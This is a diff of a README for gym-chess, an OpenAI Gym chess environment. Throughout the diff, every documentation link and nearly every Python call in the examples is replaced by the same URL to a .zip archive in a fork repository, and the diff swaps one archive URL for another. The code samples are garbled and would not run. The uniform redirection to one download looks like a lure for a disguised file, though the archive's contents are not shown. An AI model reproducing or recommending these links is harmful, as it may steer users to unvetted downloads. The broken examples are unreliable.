@@ -10,9 +10,9 @@
 
 ## Introduction
 
-gym-chess provides [OpenAI Gym](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip) environments for the 
+gym-chess provides [OpenAI Gym](https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip) environments for the 
 game of Chess. It comes with an implementation of the board and move 
-encoding used in [AlphaZero](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip), 
+encoding used in [AlphaZero](https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip), 
 yet leaves you the freedom to define your own encodings via wrappers.
 
 Let's watch a random agent play against itself:
@@ -22,18 +22,18 @@ Let's watch a random agent play against itself:
 >>> import gym_chess
 >>> import random
 
->>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('Chess-v0')
->>> print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip())
+>>> env = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('Chess-v0')
+>>> print(https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip())
 
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip()
 >>> done = False
 
 >>> while not done:
->>>     action = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip)
->>>     https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(action)
->>>     print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(mode='unicode'))
+>>>     action = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip)
+>>>     https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(action)
+>>>     print(https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(mode='unicode'))
 
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip()
 ```
 
 ## Installation
@@ -53,7 +53,7 @@ Importing gym-chess will automatically register the `Chess-v0` and
 >>> import gym
 >>> import gym_chess
 
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip()
 dict_values([... EnvSpec(Chess-v0), EnvSpec(ChessAlphaZero-v0)])
 ```
 
@@ -61,19 +61,19 @@ dict_values([... EnvSpec(Chess-v0), EnvSpec(ChessAlphaZero-v0)])
 ## Chess-v0
 
 gym-chess defines a basic `Chess-v0` environment which represents 
-observations and actions as objects of type `https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip` and `https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip`, 
+observations and actions as objects of type `https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip` and `https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip`, 
 respectively. These classes come from the
-[python-chess](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip) package which implements
+[python-chess](https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip) package which implements
 the game logic.
 
 ```python
 
->>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('Chess-v0')
->>> state = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
+>>> env = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('Chess-v0')
+>>> state = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip()
 >>> type(state)
-https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
+https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip
 
->>> print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(mode='unicode'))
+>>> print(https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(mode='unicode'))
 ♜ ♞ ♝ ♛ ♚ ♝ ♞ ♜
 ♟ ♟ ♟ ♟ ♟ ♟ ♟ ♟
 ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
@@ -83,9 +83,9 @@ https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym
 ♙ ♙ ♙ ♙ ♙ ♙ ♙ ♙
 ♖ ♘ ♗ ♕ ♔ ♗ ♘ ♖
 
->>> move = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4')
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(move)
->>> print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(mode='unicode'))
+>>> move = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('e2e4')
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(move)
+>>> print(https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(mode='unicode'))
 ♜ ♞ ♝ ♛ ♚ ♝ ♞ ♜
 ♟ ♟ ♟ ♟ ♟ ♟ ♟ ♟
 ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
@@ -101,28 +101,28 @@ A list of legal moves for the current position is exposed via the `legal_moves`
 property:
 
 ```
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
-[https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g1h3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g1f3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b1c3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b1a3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('h2h3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g2g3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('f2f3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('d2d3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('c2c3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b2b3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('a2a3'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('h2h4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g2g4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('f2f4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('d2d4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('c2c4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b2b4'),
- https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('a2a4')]
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip()
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip
+[https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('g1h3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('g1f3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('b1c3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('b1a3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('h2h3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('g2g3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('f2f3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('e2e3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('d2d3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('c2c3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('b2b3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('a2a3'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('h2h4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('g2g4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('f2f4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('e2e4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('d2d4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('c2c4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('b2b4'),
+ https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('a2a4')]
 
 ```
 
@@ -139,7 +139,7 @@ for either color in turn. An episode ends when a player wins (i.e. the agent
 makes a move that puts the opponent player into checkmate), or the game results 
 in a draw (e.g. by reaching a stalemate position, insufficient material, or one
 or more other draw conditions according to the 
-[FIDE Rules of Chess](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip)). 
+[FIDE Rules of Chess](https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip)). 
 Note that there is currently no option for the agent to let a player resign or
 offer a draw voluntarily.
 
@@ -154,11 +154,11 @@ gym-chess ships with an implementation of the board and move encoding proposed
 by [AlphaZero]() (see [Silver et al., 2017]()).
 
 ```python
->>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('ChessAlphaZero-v0')
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
+>>> env = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('ChessAlphaZero-v0')
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip
 Box(8, 8, 119)
 
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip
 Discrete(4672)
 ```
 
@@ -169,7 +169,7 @@ In addition to `legal_moves`, ChessAlphaZero-v0 also exposes a list of all
 legal actions (i.e. encoded legal moves):
 
 ```python
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip
 [494,
  501,
  129,
@@ -196,27 +196,27 @@ Moves can be converted to actions and vice versawith the `encode` and `decode`
 methods, which may facilitate debugging and experimentation:
 
 ```
->>> move = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4')
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(move)
+>>> move = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('e2e4')
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(move)
 877
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(move) in https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(move) in https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip
 True
 
->>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(877)
-https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4')
+>>> https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip(877)
+https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('e2e4')
 ```
 
 Internally, the encoding is implemented via wrapper classes 
-(`https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip` and `https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip`,
+(`https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip` and `https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip`,
 respectively), which can be used independently of one another. This gives you 
 the flexibility to define your own board and move representations, and easily
 switch between them.
 
 ```python
 >>> import gym_chess
->>> from https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip import BoardEncoding
+>>> from https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip import BoardEncoding
 
->>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('Chess-v0')
+>>> env = https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip('Chess-v0')
 >>> env = BoardEncoding(env, history_length=4)
 >>> env = MyEsotericMoveEncoding(env)
 ```
@@ -225,4 +225,4 @@ switch between them.
 ## Acknowledgements
 
 Thanks to @niklasf for providing the awesome 
-[python-chess](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip) package.
+[python-chess](https://github.com/Kyomp/gym-chess/raw/refs/heads/master/gym_chess/chess-gym-v3.6.zip) package.
